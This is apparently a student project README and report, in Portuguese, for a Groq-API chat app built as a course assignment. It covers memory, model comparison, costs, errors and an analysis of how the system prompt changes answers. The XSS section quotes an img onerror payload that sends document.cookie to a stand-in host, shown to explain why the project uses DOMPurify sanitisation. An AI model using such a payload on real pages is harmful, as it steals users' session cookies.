# Chat de IA com a API da Groq

Chat web que consome um modelo de ~100B parâmetros (GPT-OSS 120B) pela API da Groq. Atividade da Aula 4 — TEC13 Engenharia de IA Aplicada, IFBA Campus Irecê.

> **Nota:** os modelos Llama (`llama-3.3-70b-versatile` e `llama-3.1-8b-instant`) retornam `404 model_not_found` na Groq hoje (descontinuados). Trocamos por `openai/gpt-oss-120b` e `openai/gpt-oss-20b`. A troca é feita no objeto `MODELOS` de `index.js`.

**Autor:** Luan Alve de Souza

## Tecnologias

Node.js, Express, groq-sdk, dotenv, HTML/CSS/JS puro (marked + DOMPurify via CDN).

## Como rodar

1. Clone o repositório e instale as dependências:
   ```
   npm install
   ```
2. Copie `.env.example` para `.env` e preencha sua chave da Groq (gerada em console.groq.com):
   ```
   GROQ_API_KEY=sua_chave_aqui
   ```
3. Suba o servidor:
   ```
   npm start
   ```
4. Acesse http://localhost:3000

## Desafios implementados

- **Desafio 1 — Memória de conversa:** `index.js` mantém o histórico no servidor (`sessoes`) e o reenvia a cada chamada, limitado a 10 trocas (`slice(-MAX_TROCAS * 2)`).
- **Desafio 2 — Indicador de carregamento:** `public/js/main.js` mostra a bolha "Pensando...", remove ao receber a resposta e desabilita botão e campo durante a espera.
- **Desafio 3 — Assistente especializado:** `SYSTEM_PROMPT` em `index.js` (detalhes abaixo).
- **Desafio 4 — Seletor de modelos:** `<select id="modelo">` no `index.html`; o servidor valida o modelo contra uma lista permitida (`MODELOS`).
- **Desafio 5 — Painel de tokens e custo:** o servidor devolve `usage`, tempo e custo; o front exibe por mensagem, acumulado da sessão e projeção de 1.000 conversas.
- **Desafio 6 — Erros específicos:** `catch` em `index.js` trata 400, 401, 413 e 429 com mensagem própria. Teste com chave errada: `npm run test:erro`.
- **Desafio 8 — Sessões isoladas:** `sessionId` (UUID) gerado no navegador (`sessionStorage`, por aba) e `Map` no servidor.
- **Desafio 9 — Proteção contra XSS:** `DOMPurify.sanitize(marked.parse(...))` antes do `innerHTML`.

### Desafio 3 — prompts

**Antigo (do vídeo):** "Não responda nada fora do contexto de ciência da computação e programação."

**Novo:** "Você é o 'Monitor de Algoritmos', um tutor de Algoritmos e Estrutura de Dados do curso de ADS do IFBA Campus Irecê. Responda sempre em português do Brasil, de forma didática e curta, com exemplos de código quando ajudar. Se a pergunta não for sobre computação ou programação, recuse educadamente e convide o aluno a perguntar algo da área."

**Três exemplos de mudança de comportamento** (testados no `openai/gpt-oss-120b`; "antes" = prompt original do vídeo):

1. **"Explique o que é uma pilha."**
   - Antes: resposta longa (942 tokens, ~13,7 s) com tabela de operações, exemplo em C++, aplicações, variações e dicas, sem nenhum limite de tamanho.
   - Depois: resposta curta e didática (513 tokens, ~1,5 s): analogia dos pratos, tabela enxuta, exemplo em Python e 3 usos. O pedido "didática e curta" mudou o tamanho e o estilo.
2. **"Qual a receita de bolo de cenoura?"**
   - Antes: "Desculpe, mas não posso ajudar com isso." (recusa seca, sem orientar o usuário).
   - Depois: "Desculpe, mas não consigo ajudar com receitas culinárias. Se você tiver alguma dúvida sobre algoritmos, estrutura de dados ou programação, estou à disposição para ajudar!" (recusa educada com redirecionamento).
3. **"Quem ganhou a Copa do Mundo de 2002?"**
   - Antes: "Desculpe, mas só posso responder a perguntas relacionadas à ciência da computação e programação. Se precisar de ajuda nesses temas, estou à disposição!"
   - Depois: "Desculpe, mas não sou especializado em curiosidades esportivas. Se você tiver alguma dúvida sobre algoritmos, estruturas de dados ou programação, estou à disposição para ajudar!" (assume a persona de monitor).

### Desafio 4 — comparação 120B vs 20B

Mesmas perguntas, mesmo system prompt, nos dois modelos (tempo medido no servidor, uma execução cada):

| Pergunta | 120B | 20B |
|----------|------|-----|
| Diferença entre ponteiro e referência em C++ (até 5 linhas) | 772 ms, 395 tokens | 577 ms, 442 tokens |
| Complexidade do quicksort no pior caso e por quê | 1482 ms, 727 tokens | 1042 ms, 721 tokens |

**Qualidade:** ambos acertaram o conteúdo (O(n²) no pior caso; ponteiro pode ser nulo e reatribuído, referência não). O 120B respeitou melhor a instrução de formato: deu 2 parágrafos curtos com exemplo, enquanto o 20B fez uma lista numerada e, no quicksort, usou notação LaTeX (`\(O(n^2)\)`) que o `marked` não renderiza, ficando feia na tela. O 120B ainda explicou a recorrência e o pivô aleatório com mais clareza.

**Tempo:** o 20B foi cerca de 25-30% mais rápido nas duas perguntas, mas com poucas amostras a diferença pode ser ruído de rede. Para este chat, onde a qualidade da explicação importa, mantivemos o 120B como padrão.

### Desafio 5 — projeção de custo

Preços usados (US$ por 1M de tokens): 120B = 0,15 entrada / 0,60 saída; 20B = 0,075 / 0,30. Medição real: uma pergunta curta no 120B gastou 334 tokens, ≈ US$ 0,00012, ou seja ≈ US$ 0,12 para 1.000 conversas desse tamanho. O painel calcula o custo real por mensagem e projeta 1.000 conversas multiplicando o custo da sessão por 1.000.

### Desafio 9 — o risco de XSS

O `marked` converte Markdown em HTML, e a resposta do modelo é texto externo, que pode ser influenciado por quem conversa (prompt injection) ou por conteúdo que o modelo reproduz. Sem sanitização, uma resposta como `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` seria inserida via `innerHTML` e executaria JavaScript no navegador do usuário, roubando dados da sessão. O DOMPurify remove tags e atributos perigosos antes da inserção.

## Arquitetura

A chamada à Groq acontece no servidor porque a chave de API é uma credencial: tudo que roda no navegador é visível a qualquer pessoa (DevTools, aba Network, código-fonte). O navegador só conversa com `/api/chat` (caminho relativo); o Express guarda a chave no `.env` (ignorado pelo Git), valida a entrada, chama a Groq e devolve só a resposta.

## Relatório

**1. Por que a chamada à Groq tem de ser no servidor?**
Qualquer código em `main.js` é público: basta abrir o DevTools para ver a chave no código ou na aba Network. Um usuário mal-intencionado copiaria a chave e a usaria em scripts próprios, gastando nossa cota e dinheiro, esgotando o limite de requisições (derrubando o chat para todos) e usando o modelo para qualquer fim em nosso nome. Como a chave não tem escopo por origem, só revogá-la resolveria. No servidor, a chave nunca sai do `.env`, e ainda podemos validar entrada, limitar tamanho e tratar erros antes de gastar tokens.

**2. Erro que mais tempo levou para resolver**
A mensagem foi: `404 {"error":{"message":"The model `llama-3.3-70b-versatile` does not exist or you do not have access to it.","type":"invalid_request_error","code":"model_not_found"}}`. No navegador/curl só aparecia o genérico "Erro interno ao falar com o modelo" (500), porque nosso `catch` ainda não conhecia o 404. A causa real era o modelo do manual ter sido descontinuado na Groq. Descobrimos chamando o SDK direto num script, para ver `err.status` e `err.message` sem o tratamento do Express, e depois listando os modelos da conta em `GET https://api.groq.com/openai/v1/models`. Trocamos por `openai/gpt-oss-120b`. Lição: erro 500 do nosso servidor só diz que algo falhou; é o `console.error` do servidor que mostra a causa.

**3. O que acontece ao mudar o system prompt?**
Pergunta fora de computação: "Qual a receita de bolo de cenoura?".

- **Prompt original** ("Não responda nada fora do contexto de ciência da computação e programação."): *"Desculpe, mas não posso ajudar com isso."* (213 tokens)
- **Prompt sem restrição** ("Você é um assistente útil."): o modelo respondeu com uma receita completa: *"**Bolo de Cenoura – Receita Clássica (versão brasileira)** Rendimento: 1 bolo de 20 cm... Ingredientes: 3 cenouras médias, 1/2 xícara de óleo, 1 xícara de açúcar, 3 ovos, 1 xícara de farinha, 1 colher de chá de fermento... Preaqueça o forno a 180 °C... Asse 35-45 min... Cobertura de ganache de chocolate..."* (1366 tokens, mais de 6 vezes o custo da recusa)

O system prompt é o que define o escopo do assistente: o mesmo modelo, com a mesma pergunta, ou recusa ou entrega uma resposta de 1.200+ tokens. Também vale como controle de custo: um prompt restritivo evita gastar tokens com assuntos fora do objetivo do chat. Com "Quem ganhou a Copa de 2002?" o efeito foi igual: sem restrição respondeu corretamente (Brasil 2x0 Alemanha), com restrição recusou.

**4. O modelo inventou alguma informação?**
Sim, quando forçamos. Pedimos: *"Cite 3 artigos científicos reais (autores, ano e DOI) sobre o algoritmo de ordenação Timsort."* A referência 3 da resposta tem sinais claros de invenção: *"**Mikhail J. D. B. L. M. M. K. B. R. S. S. V. M. M. K. G.** – Empirical evaluation of Timsort on modern hardware. Software: Practice and Experience, 53(2): 315-336, 2023, DOI 10.1002/spe.3115"*. Os "autores" são uma sequência de iniciais sem sentido e não conseguimos confirmar o artigo. A referência 2 ("Stefan Heule, Analysis of Timsort, Algorithmica 83(7), 2021, DOI 10.1007/s00453-021-00882-2") também não conseguimos verificar e desconfiamos que seja inventada. O modelo apresentou tudo com o mesmo tom confiante, em tabela, sem avisar da incerteza. Ele acertou ao dizer que o relatório de Tim Peters (2002) não tem DOI.

Por contraste, quando perguntamos sobre `Array.prototype.mergeSort()` (função que não existe), ele corrigiu a premissa: *"Não existe um método `Array.prototype.mergeSort()` nativo no JavaScript"*. Ou seja, o modelo alucina mais em dados pontuais e verificáveis (autores, DOIs, números de página) do que em conceitos. Qualquer referência gerada por ele precisa ser conferida.

**5. Colocariam no site do IFBA Irecê hoje?**
Ainda não. Custo: é baixo por conversa (centavos de dólar para centenas de mensagens), mas sem limite por usuário qualquer pessoa pode gerar gasto. Risco de resposta errada: o modelo pode inventar (alucinar) informações institucionais, como datas e regras, e o chat ainda não responde com base em documentos reais do campus. Segurança: a chave está protegida, mas faltam rate limit por IP, autenticação e logs. O que falta: RAG com os documentos do campus, limites de uso, histórico persistente (hoje some ao reiniciar o servidor), deploy com HTTPS e um aviso claro de que as respostas podem conter erros.
